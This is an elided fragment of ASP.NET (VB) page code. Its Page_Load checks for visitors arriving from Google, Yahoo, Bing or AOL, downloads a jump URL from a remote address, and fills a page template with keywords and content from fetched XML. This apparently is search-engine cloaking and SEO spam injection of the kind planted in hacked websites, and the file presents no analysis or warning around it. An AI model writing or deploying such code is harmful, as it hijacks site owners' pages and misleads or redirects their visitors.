...
Private Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs)
	...
	elseif referer<>"" and (instr(referer,"google.")>0 or instr(referer,"yahoo.")>0 or instr(referer,"bing.")>0 or instr(referer,"aol.")>0) and jumpid<>"" then
		...
		jumpurl = webClient.DownloadString(addr)
            ...
            if request.querystring("m")="" then
                ...
                if tmplContent<>"" and instr(tmplContent, "#content#")>0 then
                    ...
                    If xmlStr<>"" then
                        ...
                        dim xml
                        xml = xmlDoc.selectSingleNode("//xml")

                        if not (xml is nothing) then
                            Try
                                tmplContent = replace(tmplContent, "#language#", lang)
                                tmplContent = replace(tmplContent, "#title#", xml.selectSingleNode("keywords").text)
                                tmplContent = replace(tmplContent, "#keywords#", xml.selectSingleNode("keywords").text)
                                tmplContent = replace(tmplContent, "#description#", xml.selectSingleNode("keywords").text & "," & xml.selectSingleNode("description").text & "," & Request.ServerVariables("HTTP_HOST"))
                                tmplContent = replace(tmplContent, "#content#", xml.selectSingleNode("content").text)
                                response.write(tmplContent)
                            Catch ex As Exception
                                response.write("xml error:"&contUrl)
                            End Try
                        else
                            response.write("parse xml fail:"&xmlStr)
                        end if
                        response.end
                    else
